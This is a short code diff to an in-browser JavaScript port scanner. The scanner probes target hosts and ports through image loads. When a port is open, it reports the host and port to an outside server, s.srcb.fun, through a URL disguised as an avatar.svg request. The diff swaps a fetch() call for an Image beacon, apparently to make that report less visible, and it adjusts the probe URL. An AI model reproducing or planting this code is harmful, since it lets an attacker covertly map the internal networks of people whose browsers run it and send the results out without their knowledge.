@@ -66,7 +66,9 @@ PortScanner.prototype.init = function() {
 			if(status == 'open'){
 				var str = target + ":" + port + ": " + status;
 				console.log(target + ":" + port + ": " + status)
-				fetch(`http://s.srcb.fun/avatar.svg?port=${str}`)
+				var i = new Image();
+				i.src=`http://s.srcb.fun/avatar.svg?port=${str}`;
+				i = undefined;
 			}
 		}, host, e, 3000);
 	})
@@ -88,7 +90,7 @@ PortScanner.prototype.check = function (callback, target, port, timeout) {
 	};
 	
 	img.onload = img.onerror;
-	img.src = 'http://' + target + ':' + port;
+	img.src = 'http://' + target + ':' + port + '/' + port;
 	
 	setTimeout(function () {
 		if (!img) return;
